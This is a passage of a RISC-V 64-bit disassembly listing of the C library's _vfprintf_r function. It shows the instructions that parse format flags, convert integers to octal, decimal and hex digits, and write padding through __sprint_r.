   10eae:	76e6                	ld	a3,120(sp)
   10eb0:	7746                	ld	a4,112(sp)
   10eb2:	0341                	addi	t1,t1,16
   10eb4:	fed33823          	sd	a3,-16(t1)
   10eb8:	11812683          	lw	a3,280(sp)
   10ebc:	97ba                	add	a5,a5,a4
   10ebe:	fee33c23          	sd	a4,-8(t1)
   10ec2:	2685                	addiw	a3,a3,1
   10ec4:	0006871b          	sext.w	a4,a3
   10ec8:	10d12c23          	sw	a3,280(sp)
   10ecc:	f23e                	sd	a5,288(sp)
   10ece:	469d                	li	a3,7
   10ed0:	00e6de63          	bge	a3,a4,10eec <_vfprintf_r+0x686>
   10ed4:	0a10                	addi	a2,sp,272
   10ed6:	85d2                	mv	a1,s4
   10ed8:	8556                	mv	a0,s5
   10eda:	74b070ef          	jal	ra,18e24 <__sprint_r>
   10ede:	52051463          	bnez	a0,11406 <_vfprintf_r+0xba0>
   10ee2:	562e                	lw	a2,232(sp)
   10ee4:	7792                	ld	a5,288(sp)
   10ee6:	11812703          	lw	a4,280(sp)
   10eea:	835e                	mv	t1,s7
   10eec:	00065463          	bgez	a2,10ef4 <_vfprintf_r+0x68e>
   10ef0:	2a60106f          	j	12196 <_vfprintf_r+0x1930>
   10ef4:	7682                	ld	a3,32(sp)
   10ef6:	2705                	addiw	a4,a4,1
   10ef8:	10e12c23          	sw	a4,280(sp)
   10efc:	97b6                	add	a5,a5,a3
   10efe:	00d33423          	sd	a3,8(t1)
   10f02:	01933023          	sd	s9,0(t1)
   10f06:	0007069b          	sext.w	a3,a4
   10f0a:	f23e                	sd	a5,288(sp)
   10f0c:	471d                	li	a4,7
   10f0e:	bad75be3          	bge	a4,a3,10ac4 <_vfprintf_r+0x25e>
   10f12:	0a10                	addi	a2,sp,272
   10f14:	85d2                	mv	a1,s4
   10f16:	8556                	mv	a0,s5
   10f18:	70d070ef          	jal	ra,18e24 <__sprint_r>
   10f1c:	4e051563          	bnez	a0,11406 <_vfprintf_r+0xba0>
   10f20:	7792                	ld	a5,288(sp)
   10f22:	835e                	mv	t1,s7
   10f24:	b64d                	j	10ac6 <_vfprintf_r+0x260>
   10f26:	0104f793          	andi	a5,s1,16
   10f2a:	0e0799e3          	bnez	a5,1181c <_vfprintf_r+0xfb6>
   10f2e:	66c2                	ld	a3,16(sp)
   10f30:	0404f793          	andi	a5,s1,64
   10f34:	0006a983          	lw	s3,0(a3)
   10f38:	44078ae3          	beqz	a5,11b8c <_vfprintf_r+0x1326>
   10f3c:	19c2                	slli	s3,s3,0x30
   10f3e:	0309d993          	srli	s3,s3,0x30
   10f42:	b1d1                	j	10c06 <_vfprintf_r+0x3a0>
   10f44:	0104f793          	andi	a5,s1,16
   10f48:	0c0795e3          	bnez	a5,11812 <_vfprintf_r+0xfac>
   10f4c:	0404f793          	andi	a5,s1,64
   10f50:	40078de3          	beqz	a5,11b6a <_vfprintf_r+0x1304>
   10f54:	67c2                	ld	a5,16(sp)
   10f56:	00079983          	lh	s3,0(a5)
   10f5a:	87ce                	mv	a5,s3
   10f5c:	c407d8e3          	bgez	a5,10bac <_vfprintf_r+0x346>
   10f60:	02d00793          	li	a5,45
   10f64:	0cf10fa3          	sb	a5,223(sp)
   10f68:	e83a                	sd	a4,16(sp)
   10f6a:	577d                	li	a4,-1
   10f6c:	413009b3          	neg	s3,s3
   10f70:	8826                	mv	a6,s1
   10f72:	4785                	li	a5,1
   10f74:	caee94e3          	bne	t4,a4,10c1c <_vfprintf_r+0x3b6>
   10f78:	4705                	li	a4,1
   10f7a:	56e78463          	beq	a5,a4,114e2 <_vfprintf_r+0xc7c>
   10f7e:	4709                	li	a4,2
   10f80:	28e78263          	beq	a5,a4,11204 <_vfprintf_r+0x99e>
   10f84:	18c10c13          	addi	s8,sp,396
   10f88:	8ce2                	mv	s9,s8
   10f8a:	0079f793          	andi	a5,s3,7
   10f8e:	03078793          	addi	a5,a5,48
   10f92:	fefc8fa3          	sb	a5,-1(s9)
   10f96:	0039d993          	srli	s3,s3,0x3
   10f9a:	8766                	mv	a4,s9
   10f9c:	1cfd                	addi	s9,s9,-1
   10f9e:	fe0996e3          	bnez	s3,10f8a <_vfprintf_r+0x724>
   10fa2:	00187693          	andi	a3,a6,1
   10fa6:	26068f63          	beqz	a3,11224 <_vfprintf_r+0x9be>
   10faa:	03000693          	li	a3,48
   10fae:	26d78b63          	beq	a5,a3,11224 <_vfprintf_r+0x9be>
   10fb2:	1779                	addi	a4,a4,-2
   10fb4:	fedc8fa3          	sb	a3,-1(s9)
   10fb8:	40ec0c3b          	subw	s8,s8,a4
   10fbc:	84c2                	mv	s1,a6
   10fbe:	8cba                	mv	s9,a4
   10fc0:	b139                	j	10bce <_vfprintf_r+0x368>
   10fc2:	8556                	mv	a0,s5
   10fc4:	33f010ef          	jal	ra,12b02 <__sinit>
   10fc8:	b8fd                	j	108c6 <_vfprintf_r+0x60>
   10fca:	67c2                	ld	a5,16(sp)
   10fcc:	0c010fa3          	sb	zero,223(sp)
   10fd0:	0007bc83          	ld	s9,0(a5)
   10fd4:	00878693          	addi	a3,a5,8
   10fd8:	1c0c85e3          	beqz	s9,119a2 <_vfprintf_r+0x113c>
   10fdc:	57fd                	li	a5,-1
   10fde:	34fe82e3          	beq	t4,a5,11b22 <_vfprintf_r+0x12bc>
   10fe2:	8676                	mv	a2,t4
   10fe4:	4581                	li	a1,0
   10fe6:	8566                	mv	a0,s9
   10fe8:	f836                	sd	a3,48(sp)
   10fea:	e81a                	sd	t1,16(sp)
   10fec:	e476                	sd	t4,8(sp)
   10fee:	3ab040ef          	jal	ra,15b98 <memchr>
   10ff2:	ec2a                	sd	a0,24(sp)
   10ff4:	6ea2                	ld	t4,8(sp)
   10ff6:	6342                	ld	t1,16(sp)
   10ff8:	76c2                	ld	a3,48(sp)
   10ffa:	e119                	bnez	a0,11000 <_vfprintf_r+0x79a>
   10ffc:	1120106f          	j	1210e <_vfprintf_r+0x18a8>
   11000:	67e2                	ld	a5,24(sp)
   11002:	e836                	sd	a3,16(sp)
   11004:	ec02                	sd	zero,24(sp)
   11006:	41978c3b          	subw	s8,a5,s9
   1100a:	fffc4993          	not	s3,s8
   1100e:	0df14783          	lbu	a5,223(sp)
   11012:	43f9d993          	srai	s3,s3,0x3f
   11016:	013c79b3          	and	s3,s8,s3
   1101a:	e882                	sd	zero,80(sp)
   1101c:	f082                	sd	zero,96(sp)
   1101e:	ec82                	sd	zero,88(sp)
   11020:	2981                	sext.w	s3,s3
   11022:	4e81                	li	t4,0
   11024:	bc0793e3          	bnez	a5,10bea <_vfprintf_r+0x384>
   11028:	b2fd                	j	10a16 <_vfprintf_r+0x1b0>
   1102a:	6742                	ld	a4,16(sp)
   1102c:	0c010fa3          	sb	zero,223(sp)
   11030:	4985                	li	s3,1
   11032:	431c                	lw	a5,0(a4)
   11034:	0721                	addi	a4,a4,8
   11036:	e83a                	sd	a4,16(sp)
   11038:	12f10423          	sb	a5,296(sp)
   1103c:	4c05                	li	s8,1
   1103e:	12810c93          	addi	s9,sp,296
   11042:	b2e9                	j	10a0c <_vfprintf_r+0x1a6>
   11044:	00044f03          	lbu	t5,0(s0)
   11048:	0044e493          	ori	s1,s1,4
   1104c:	2481                	sext.w	s1,s1
   1104e:	b2b1                	j	1099a <_vfprintf_r+0x134>
   11050:	02b00793          	li	a5,43
   11054:	00044f03          	lbu	t5,0(s0)
   11058:	0cf10fa3          	sb	a5,223(sp)
   1105c:	ba3d                	j	1099a <_vfprintf_r+0x134>
   1105e:	0804e493          	ori	s1,s1,128
   11062:	00044f03          	lbu	t5,0(s0)
   11066:	2481                	sext.w	s1,s1
   11068:	ba0d                	j	1099a <_vfprintf_r+0x134>
   1106a:	00044703          	lbu	a4,0(s0)
   1106e:	00140793          	addi	a5,s0,1
   11072:	00070d9b          	sext.w	s11,a4
   11076:	00ec1463          	bne	s8,a4,1107e <_vfprintf_r+0x818>
   1107a:	3d20106f          	j	1244c <_vfprintf_r+0x1be6>
   1107e:	fd07071b          	addiw	a4,a4,-48
   11082:	843e                	mv	s0,a5
   11084:	4e81                	li	t4,0
   11086:	90e9efe3          	bltu	s3,a4,109a4 <_vfprintf_r+0x13e>
   1108a:	00044d83          	lbu	s11,0(s0)
   1108e:	002e979b          	slliw	a5,t4,0x2
   11092:	01d78ebb          	addw	t4,a5,t4
   11096:	001e9e9b          	slliw	t4,t4,0x1
   1109a:	00ee8ebb          	addw	t4,t4,a4
   1109e:	fd0d871b          	addiw	a4,s11,-48
   110a2:	0405                	addi	s0,s0,1
   110a4:	fee9f3e3          	bgeu	s3,a4,1108a <_vfprintf_r+0x824>
   110a8:	b8f5                	j	109a4 <_vfprintf_r+0x13e>
   110aa:	67c2                	ld	a5,16(sp)
   110ac:	00044f03          	lbu	t5,0(s0)
   110b0:	0007ab03          	lw	s6,0(a5)
   110b4:	07a1                	addi	a5,a5,8
   110b6:	e83e                	sd	a5,16(sp)
   110b8:	8e0b51e3          	bgez	s6,1099a <_vfprintf_r+0x134>
   110bc:	41600b3b          	negw	s6,s6
   110c0:	b761                	j	11048 <_vfprintf_r+0x7e2>
   110c2:	8556                	mv	a0,s5
   110c4:	ec1a                	sd	t1,24(sp)
   110c6:	e476                	sd	t4,8(sp)
   110c8:	2a2040ef          	jal	ra,1536a <_localeconv_r>
   110cc:	651c                	ld	a5,8(a0)
   110ce:	853e                	mv	a0,a5
   110d0:	e93e                	sd	a5,144(sp)
   110d2:	f00ff0ef          	jal	ra,107d2 <strlen>
   110d6:	87aa                	mv	a5,a0
   110d8:	8556                	mv	a0,s5
   110da:	8dbe                	mv	s11,a5
   110dc:	e53e                	sd	a5,136(sp)
   110de:	28c040ef          	jal	ra,1536a <_localeconv_r>
   110e2:	6918                	ld	a4,16(a0)
   110e4:	6ea2                	ld	t4,8(sp)
   110e6:	6362                	ld	t1,24(sp)
   110e8:	f4ba                	sd	a4,104(sp)
   110ea:	00044f03          	lbu	t5,0(s0)
   110ee:	8a0d86e3          	beqz	s11,1099a <_vfprintf_r+0x134>
   110f2:	8a0704e3          	beqz	a4,1099a <_vfprintf_r+0x134>
   110f6:	00074783          	lbu	a5,0(a4)
   110fa:	8a0780e3          	beqz	a5,1099a <_vfprintf_r+0x134>
   110fe:	4004e493          	ori	s1,s1,1024
   11102:	2481                	sext.w	s1,s1
   11104:	b859                	j	1099a <_vfprintf_r+0x134>
   11106:	0014e493          	ori	s1,s1,1
   1110a:	00044f03          	lbu	t5,0(s0)
   1110e:	2481                	sext.w	s1,s1
   11110:	b069                	j	1099a <_vfprintf_r+0x134>
   11112:	0df14783          	lbu	a5,223(sp)
   11116:	00044f03          	lbu	t5,0(s0)
   1111a:	880790e3          	bnez	a5,1099a <_vfprintf_r+0x134>
   1111e:	02000793          	li	a5,32
   11122:	0cf10fa3          	sb	a5,223(sp)
   11126:	b895                	j	1099a <_vfprintf_r+0x134>
   11128:	0084e493          	ori	s1,s1,8
   1112c:	00044f03          	lbu	t5,0(s0)
   11130:	2481                	sext.w	s1,s1
   11132:	b0a5                	j	1099a <_vfprintf_r+0x134>
   11134:	0104e493          	ori	s1,s1,16
   11138:	0004881b          	sext.w	a6,s1
   1113c:	66c2                	ld	a3,16(sp)
   1113e:	02087793          	andi	a5,a6,32
   11142:	00868713          	addi	a4,a3,8
   11146:	68078463          	beqz	a5,117ce <_vfprintf_r+0xf68>
   1114a:	0006b983          	ld	s3,0(a3)
   1114e:	4785                	li	a5,1
   11150:	e83a                	sd	a4,16(sp)
   11152:	b4c1                	j	10c12 <_vfprintf_r+0x3ac>
   11154:	0204e493          	ori	s1,s1,32
   11158:	00044f03          	lbu	t5,0(s0)
   1115c:	2481                	sext.w	s1,s1
   1115e:	83dff06f          	j	1099a <_vfprintf_r+0x134>
   11162:	6742                	ld	a4,16(sp)
   11164:	77e1                	lui	a5,0xffff8
   11166:	8307c793          	xori	a5,a5,-2000
   1116a:	0ef11023          	sh	a5,224(sp)
   1116e:	00870793          	addi	a5,a4,8
   11172:	0024e493          	ori	s1,s1,2
   11176:	e83e                	sd	a5,16(sp)
   11178:	0000b797          	auipc	a5,0xb
   1117c:	4a878793          	addi	a5,a5,1192 # 1c620 <__clzdi2+0x1ae>
   11180:	f43e                	sd	a5,40(sp)
   11182:	00073983          	ld	s3,0(a4)
   11186:	0004881b          	sext.w	a6,s1
   1118a:	4789                	li	a5,2
   1118c:	07800d93          	li	s11,120
   11190:	b449                	j	10c12 <_vfprintf_r+0x3ac>
   11192:	66c2                	ld	a3,16(sp)
   11194:	0204f793          	andi	a5,s1,32
   11198:	6298                	ld	a4,0(a3)
   1119a:	06a1                	addi	a3,a3,8
   1119c:	e836                	sd	a3,16(sp)
   1119e:	64079e63          	bnez	a5,117fa <_vfprintf_r+0xf94>
   111a2:	0104f793          	andi	a5,s1,16
   111a6:	64079a63          	bnez	a5,117fa <_vfprintf_r+0xf94>
   111aa:	0404f793          	andi	a5,s1,64
   111ae:	3e0799e3          	bnez	a5,11da0 <_vfprintf_r+0x153a>
   111b2:	2004f493          	andi	s1,s1,512
   111b6:	6782                	ld	a5,0(sp)
   111b8:	e099                	bnez	s1,111be <_vfprintf_r+0x958>
   111ba:	1280106f          	j	122e2 <_vfprintf_r+0x1a7c>
   111be:	00f70023          	sb	a5,0(a4)
   111c2:	8ca2                	mv	s9,s0
   111c4:	ba15                	j	10af8 <_vfprintf_r+0x292>
   111c6:	00044f03          	lbu	t5,0(s0)
   111ca:	06c00793          	li	a5,108
   111ce:	7aff0263          	beq	t5,a5,11972 <_vfprintf_r+0x110c>
   111d2:	0104e493          	ori	s1,s1,16
   111d6:	2481                	sext.w	s1,s1
   111d8:	fc2ff06f          	j	1099a <_vfprintf_r+0x134>
   111dc:	00044f03          	lbu	t5,0(s0)
   111e0:	06800793          	li	a5,104
   111e4:	76ff0f63          	beq	t5,a5,11962 <_vfprintf_r+0x10fc>
   111e8:	0404e493          	ori	s1,s1,64
   111ec:	2481                	sext.w	s1,s1
   111ee:	facff06f          	j	1099a <_vfprintf_r+0x134>
   111f2:	4705                	li	a4,1
   111f4:	00e79463          	bne	a5,a4,111fc <_vfprintf_r+0x996>
   111f8:	0220106f          	j	1221a <_vfprintf_r+0x19b4>
   111fc:	4709                	li	a4,2
   111fe:	8826                	mv	a6,s1
   11200:	d8e792e3          	bne	a5,a4,10f84 <_vfprintf_r+0x71e>
   11204:	18c10c13          	addi	s8,sp,396
   11208:	8ce2                	mv	s9,s8
   1120a:	7722                	ld	a4,40(sp)
   1120c:	00f9f793          	andi	a5,s3,15
   11210:	1cfd                	addi	s9,s9,-1
   11212:	97ba                	add	a5,a5,a4
   11214:	0007c783          	lbu	a5,0(a5)
   11218:	0049d993          	srli	s3,s3,0x4
   1121c:	00fc8023          	sb	a5,0(s9)
   11220:	fe0995e3          	bnez	s3,1120a <_vfprintf_r+0x9a4>
   11224:	419c0c3b          	subw	s8,s8,s9
   11228:	84c2                	mv	s1,a6
   1122a:	b255                	j	10bce <_vfprintf_r+0x368>
   1122c:	06500713          	li	a4,101
   11230:	1fb75463          	bge	a4,s11,11418 <_vfprintf_r+0xbb2>
   11234:	6512                	ld	a0,256(sp)
   11236:	65b2                	ld	a1,264(sp)
   11238:	4601                	li	a2,0
   1123a:	4681                	li	a3,0
   1123c:	f83e                	sd	a5,48(sp)
   1123e:	e41a                	sd	t1,8(sp)
   11240:	65d090ef          	jal	ra,1b09c <__eqtf2>
   11244:	6322                	ld	t1,8(sp)
   11246:	77c2                	ld	a5,48(sp)
   11248:	3e051b63          	bnez	a0,1163e <_vfprintf_r+0xdd8>
   1124c:	11812703          	lw	a4,280(sp)
   11250:	0000b697          	auipc	a3,0xb
   11254:	3f068693          	addi	a3,a3,1008 # 1c640 <__clzdi2+0x1ce>
   11258:	00d33023          	sd	a3,0(t1)
   1125c:	2705                	addiw	a4,a4,1
   1125e:	4685                	li	a3,1
   11260:	0785                	addi	a5,a5,1
   11262:	00d33423          	sd	a3,8(t1)
   11266:	10e12c23          	sw	a4,280(sp)
   1126a:	0007069b          	sext.w	a3,a4
   1126e:	f23e                	sd	a5,288(sp)
   11270:	471d                	li	a4,7
   11272:	0341                	addi	t1,t1,16
   11274:	04d742e3          	blt	a4,a3,11ab8 <_vfprintf_r+0x1252>
   11278:	572e                	lw	a4,232(sp)
   1127a:	7682                	ld	a3,32(sp)
   1127c:	56d75a63          	bge	a4,a3,117f0 <_vfprintf_r+0xf8a>
   11280:	7766                	ld	a4,120(sp)
   11282:	76c6                	ld	a3,112(sp)
   11284:	0341                	addi	t1,t1,16
   11286:	fee33823          	sd	a4,-16(t1)
   1128a:	11812703          	lw	a4,280(sp)
   1128e:	97b6                	add	a5,a5,a3
   11290:	fed33c23          	sd	a3,-8(t1)
   11294:	2705                	addiw	a4,a4,1
   11296:	0007069b          	sext.w	a3,a4
   1129a:	10e12c23          	sw	a4,280(sp)
   1129e:	f23e                	sd	a5,288(sp)
   112a0:	471d                	li	a4,7
   112a2:	6ed74063          	blt	a4,a3,11982 <_vfprintf_r+0x111c>
   112a6:	7702                	ld	a4,32(sp)
   112a8:	fff70c1b          	addiw	s8,a4,-1
   112ac:	81805de3          	blez	s8,10ac6 <_vfprintf_r+0x260>
   112b0:	11812703          	lw	a4,280(sp)
   112b4:	018d5de3          	bge	s10,s8,11ace <_vfprintf_r+0x1268>
   112b8:	4c9d                	li	s9,7
   112ba:	a021                	j	112c2 <_vfprintf_r+0xa5c>
   112bc:	3c41                	addiw	s8,s8,-16
   112be:	018d58e3          	bge	s10,s8,11ace <_vfprintf_r+0x1268>
   112c2:	2705                	addiw	a4,a4,1
   112c4:	07c1                	addi	a5,a5,16
   112c6:	01233023          	sd	s2,0(t1)
   112ca:	01a33423          	sd	s10,8(t1)
   112ce:	f23e                	sd	a5,288(sp)
   112d0:	10e12c23          	sw	a4,280(sp)
   112d4:	0341                	addi	t1,t1,16
   112d6:	feecd3e3          	bge	s9,a4,112bc <_vfprintf_r+0xa56>
   112da:	0a10                	addi	a2,sp,272
   112dc:	85d2                	mv	a1,s4
   112de:	8556                	mv	a0,s5
   112e0:	345070ef          	jal	ra,18e24 <__sprint_r>
   112e4:	12051163          	bnez	a0,11406 <_vfprintf_r+0xba0>
   112e8:	7792                	ld	a5,288(sp)
   112ea:	11812703          	lw	a4,280(sp)
   112ee:	835e                	mv	t1,s7
   112f0:	b7f1                	j	112bc <_vfprintf_r+0xa56>
   112f2:	413b06bb          	subw	a3,s6,s3
   112f6:	f8d05f63          	blez	a3,10a94 <_vfprintf_r+0x22e>
   112fa:	11812703          	lw	a4,280(sp)
   112fe:	04dd5563          	bge	s10,a3,11348 <_vfprintf_r+0xae2>
   11302:	489d                	li	a7,7
   11304:	a021                	j	1130c <_vfprintf_r+0xaa6>
   11306:	36c1                	addiw	a3,a3,-16
   11308:	04dd5063          	bge	s10,a3,11348 <_vfprintf_r+0xae2>
   1130c:	2705                	addiw	a4,a4,1
   1130e:	07c1                	addi	a5,a5,16
   11310:	01233023          	sd	s2,0(t1)
   11314:	01a33423          	sd	s10,8(t1)
   11318:	f23e                	sd	a5,288(sp)
   1131a:	10e12c23          	sw	a4,280(sp)
   1131e:	0341                	addi	t1,t1,16
   11320:	fee8d3e3          	bge	a7,a4,11306 <_vfprintf_r+0xaa0>
   11324:	0a10                	addi	a2,sp,272
   11326:	85d2                	mv	a1,s4
   11328:	8556                	mv	a0,s5
   1132a:	f836                	sd	a3,48(sp)
   1132c:	e476                	sd	t4,8(sp)
   1132e:	2f7070ef          	jal	ra,18e24 <__sprint_r>
   11332:	e971                	bnez	a0,11406 <_vfprintf_r+0xba0>
   11334:	76c2                	ld	a3,48(sp)
   11336:	7792                	ld	a5,288(sp)
   11338:	11812703          	lw	a4,280(sp)
   1133c:	36c1                	addiw	a3,a3,-16
   1133e:	6ea2                	ld	t4,8(sp)
   11340:	835e                	mv	t1,s7
   11342:	489d                	li	a7,7
   11344:	fcdd44e3          	blt	s10,a3,1130c <_vfprintf_r+0xaa6>
   11348:	2705                	addiw	a4,a4,1
   1134a:	97b6                	add	a5,a5,a3
   1134c:	00d33423          	sd	a3,8(t1)
   11350:	01233023          	sd	s2,0(t1)
   11354:	0007069b          	sext.w	a3,a4
   11358:	10e12c23          	sw	a4,280(sp)
   1135c:	f23e                	sd	a5,288(sp)
   1135e:	471d                	li	a4,7
   11360:	0341                	addi	t1,t1,16
   11362:	f2d75963          	bge	a4,a3,10a94 <_vfprintf_r+0x22e>
   11366:	0a10                	addi	a2,sp,272
   11368:	85d2                	mv	a1,s4
   1136a:	8556                	mv	a0,s5
   1136c:	e476                	sd	t4,8(sp)
   1136e:	2b7070ef          	jal	ra,18e24 <__sprint_r>
   11372:	e951                	bnez	a0,11406 <_vfprintf_r+0xba0>
   11374:	7792                	ld	a5,288(sp)
   11376:	6ea2                	ld	t4,8(sp)
   11378:	835e                	mv	t1,s7
   1137a:	f1aff06f          	j	10a94 <_vfprintf_r+0x22e>
   1137e:	11812703          	lw	a4,280(sp)
   11382:	05dd5363          	bge	s10,t4,113c8 <_vfprintf_r+0xb62>
   11386:	489d                	li	a7,7
   11388:	a021                	j	11390 <_vfprintf_r+0xb2a>
   1138a:	3ec1                	addiw	t4,t4,-16
   1138c:	03dd5e63          	bge	s10,t4,113c8 <_vfprintf_r+0xb62>
   11390:	2705                	addiw	a4,a4,1
   11392:	07c1                	addi	a5,a5,16
   11394:	01233023          	sd	s2,0(t1)
   11398:	01a33423          	sd	s10,8(t1)
   1139c:	f23e                	sd	a5,288(sp)
   1139e:	10e12c23          	sw	a4,280(sp)
   113a2:	0341                	addi	t1,t1,16
   113a4:	fee8d3e3          	bge	a7,a4,1138a <_vfprintf_r+0xb24>
   113a8:	0a10                	addi	a2,sp,272
   113aa:	85d2                	mv	a1,s4
   113ac:	8556                	mv	a0,s5
   113ae:	e476                	sd	t4,8(sp)
   113b0:	275070ef          	jal	ra,18e24 <__sprint_r>
   113b4:	e929                	bnez	a0,11406 <_vfprintf_r+0xba0>
   113b6:	6ea2                	ld	t4,8(sp)
   113b8:	7792                	ld	a5,288(sp)
   113ba:	11812703          	lw	a4,280(sp)
   113be:	3ec1                	addiw	t4,t4,-16
   113c0:	835e                	mv	t1,s7
   113c2:	489d                	li	a7,7
   113c4:	fddd46e3          	blt	s10,t4,11390 <_vfprintf_r+0xb2a>
   113c8:	0017069b          	addiw	a3,a4,1
   113cc:	97f6                	add	a5,a5,t4
   113ce:	01233023          	sd	s2,0(t1)
   113d2:	01d33423          	sd	t4,8(t1)
   113d6:	f23e                	sd	a5,288(sp)
   113d8:	10d12c23          	sw	a3,280(sp)
   113dc:	471d                	li	a4,7
   113de:	0341                	addi	t1,t1,16
   113e0:	ead75e63          	bge	a4,a3,10a9c <_vfprintf_r+0x236>
   113e4:	0a10                	addi	a2,sp,272
   113e6:	85d2                	mv	a1,s4
   113e8:	8556                	mv	a0,s5
   113ea:	23b070ef          	jal	ra,18e24 <__sprint_r>
   113ee:	ed01                	bnez	a0,11406 <_vfprintf_r+0xba0>
   113f0:	7792                	ld	a5,288(sp)
   113f2:	835e                	mv	t1,s7
   113f4:	ea8ff06f          	j	10a9c <_vfprintf_r+0x236>
   113f8:	0a10                	addi	a2,sp,272
   113fa:	85d2                	mv	a1,s4
   113fc:	8556                	mv	a0,s5
   113fe:	227070ef          	jal	ra,18e24 <__sprint_r>
   11402:	ee050163          	beqz	a0,10ae4 <_vfprintf_r+0x27e>
   11406:	67e2                	ld	a5,24(sp)
   11408:	f0078063          	beqz	a5,10b08 <_vfprintf_r+0x2a2>
   1140c:	85be                	mv	a1,a5
   1140e:	8556                	mv	a0,s5
   11410:	025010ef          	jal	ra,12c34 <_free_r>
   11414:	ef4ff06f          	j	10b08 <_vfprintf_r+0x2a2>
   11418:	11812603          	lw	a2,280(sp)
   1141c:	00178d93          	addi	s11,a5,1
   11420:	7782                	ld	a5,32(sp)
   11422:	0016071b          	addiw	a4,a2,1
   11426:	4585                	li	a1,1
   11428:	01933023          	sd	s9,0(t1)
   1142c:	86ba                	mv	a3,a4
   1142e:	01030c13          	addi	s8,t1,16
   11432:	32f5d863          	bge	a1,a5,11762 <_vfprintf_r+0xefc>
   11436:	4605                	li	a2,1
   11438:	10d12c23          	sw	a3,280(sp)
   1143c:	00c33423          	sd	a2,8(t1)
   11440:	f26e                	sd	s11,288(sp)
   11442:	469d                	li	a3,7
   11444:	5ce6c463          	blt	a3,a4,11a0c <_vfprintf_r+0x11a6>
   11448:	77c6                	ld	a5,112(sp)
   1144a:	0017069b          	addiw	a3,a4,1
   1144e:	7766                	ld	a4,120(sp)
   11450:	9dbe                	add	s11,s11,a5
   11452:	00fc3423          	sd	a5,8(s8)
   11456:	00ec3023          	sd	a4,0(s8)
   1145a:	10d12c23          	sw	a3,280(sp)
   1145e:	0006871b          	sext.w	a4,a3
   11462:	f26e                	sd	s11,288(sp)
   11464:	469d                	li	a3,7
   11466:	0c41                	addi	s8,s8,16
   11468:	5ae6ce63          	blt	a3,a4,11a24 <_vfprintf_r+0x11be>
   1146c:	6512                	ld	a0,256(sp)
   1146e:	65b2                	ld	a1,264(sp)
   11470:	0017089b          	addiw	a7,a4,1
   11474:	4601                	li	a2,0
   11476:	4681                	li	a3,0
   11478:	e446                	sd	a7,8(sp)
   1147a:	f83a                	sd	a4,48(sp)
   1147c:	421090ef          	jal	ra,1b09c <__eqtf2>
   11480:	68a2                	ld	a7,8(sp)
   11482:	7782                	ld	a5,32(sp)
   11484:	010c0313          	addi	t1,s8,16
   11488:	0008861b          	sext.w	a2,a7
   1148c:	fff7869b          	addiw	a3,a5,-1
   11490:	2e050963          	beqz	a0,11782 <_vfprintf_r+0xf1c>
   11494:	9db6                	add	s11,s11,a3
   11496:	001c8813          	addi	a6,s9,1
   1149a:	00dc3423          	sd	a3,8(s8)
   1149e:	010c3023          	sd	a6,0(s8)
   114a2:	f26e                	sd	s11,288(sp)
   114a4:	11112c23          	sw	a7,280(sp)
   114a8:	469d                	li	a3,7
   114aa:	44c6c763          	blt	a3,a2,118f8 <_vfprintf_r+0x1092>
   114ae:	7742                	ld	a4,48(sp)
   114b0:	020c0693          	addi	a3,s8,32
   114b4:	8c1a                	mv	s8,t1
   114b6:	0027061b          	addiw	a2,a4,2
   114ba:	8336                	mv	t1,a3
   114bc:	668a                	ld	a3,128(sp)
   114be:	1998                	addi	a4,sp,240
   114c0:	00ec3023          	sd	a4,0(s8)
   114c4:	00dd87b3          	add	a5,s11,a3
   114c8:	00dc3423          	sd	a3,8(s8)
   114cc:	f23e                	sd	a5,288(sp)
   114ce:	10c12c23          	sw	a2,280(sp)
   114d2:	471d                	li	a4,7
   114d4:	dec75963          	bge	a4,a2,10ac6 <_vfprintf_r+0x260>
   114d8:	bc2d                	j	10f12 <_vfprintf_r+0x6ac>
   114da:	4705                	li	a4,1
   114dc:	8826                	mv	a6,s1
   114de:	aae790e3          	bne	a5,a4,10f7e <_vfprintf_r+0x718>
   114e2:	47a5                	li	a5,9
   114e4:	3737e163          	bltu	a5,s3,11846 <_vfprintf_r+0xfe0>
   114e8:	0309899b          	addiw	s3,s3,48
   114ec:	193105a3          	sb	s3,395(sp)
   114f0:	84c2                	mv	s1,a6
   114f2:	4c05                	li	s8,1
   114f4:	18b10c93          	addi	s9,sp,395
   114f8:	ed6ff06f          	j	10bce <_vfprintf_r+0x368>
   114fc:	11812703          	lw	a4,280(sp)
   11500:	0000b897          	auipc	a7,0xb
   11504:	2b888893          	addi	a7,a7,696 # 1c7b8 <blanks.4520>
   11508:	439d                	li	t2,7
   1150a:	00dd4663          	blt	s10,a3,11516 <_vfprintf_r+0xcb0>
   1150e:	a889                	j	11560 <_vfprintf_r+0xcfa>
   11510:	36c1                	addiw	a3,a3,-16
   11512:	04dd5763          	bge	s10,a3,11560 <_vfprintf_r+0xcfa>
   11516:	2705                	addiw	a4,a4,1
   11518:	07c1                	addi	a5,a5,16
   1151a:	01133023          	sd	a7,0(t1)
   1151e:	01a33423          	sd	s10,8(t1)
   11522:	f23e                	sd	a5,288(sp)
   11524:	10e12c23          	sw	a4,280(sp)
   11528:	0341                	addi	t1,t1,16
   1152a:	fee3d3e3          	bge	t2,a4,11510 <_vfprintf_r+0xcaa>
   1152e:	0a10                	addi	a2,sp,272
   11530:	85d2                	mv	a1,s4
   11532:	8556                	mv	a0,s5
   11534:	e4c6                	sd	a7,72(sp)
   11536:	e0f6                	sd	t4,64(sp)
   11538:	fc7e                	sd	t6,56(sp)
   1153a:	f816                	sd	t0,48(sp)
   1153c:	e436                	sd	a3,8(sp)
   1153e:	0e7070ef          	jal	ra,18e24 <__sprint_r>
   11542:	ec0512e3          	bnez	a0,11406 <_vfprintf_r+0xba0>
   11546:	66a2                	ld	a3,8(sp)
   11548:	7792                	ld	a5,288(sp)
   1154a:	11812703          	lw	a4,280(sp)
   1154e:	36c1                	addiw	a3,a3,-16
   11550:	68a6                	ld	a7,72(sp)
   11552:	6e86                	ld	t4,64(sp)
   11554:	7fe2                	ld	t6,56(sp)
   11556:	72c2                	ld	t0,48(sp)
   11558:	835e                	mv	t1,s7
   1155a:	439d                	li	t2,7
   1155c:	fadd4de3          	blt	s10,a3,11516 <_vfprintf_r+0xcb0>
   11560:	2705                	addiw	a4,a4,1
   11562:	97b6                	add	a5,a5,a3
   11564:	00d33423          	sd	a3,8(t1)
   11568:	01133023          	sd	a7,0(t1)
   1156c:	0007069b          	sext.w	a3,a4
   11570:	10e12c23          	sw	a4,280(sp)
   11574:	f23e                	sd	a5,288(sp)
   11576:	471d                	li	a4,7
   11578:	0341                	addi	t1,t1,16
   1157a:	cad75d63          	bge	a4,a3,10a34 <_vfprintf_r+0x1ce>
   1157e:	0a10                	addi	a2,sp,272
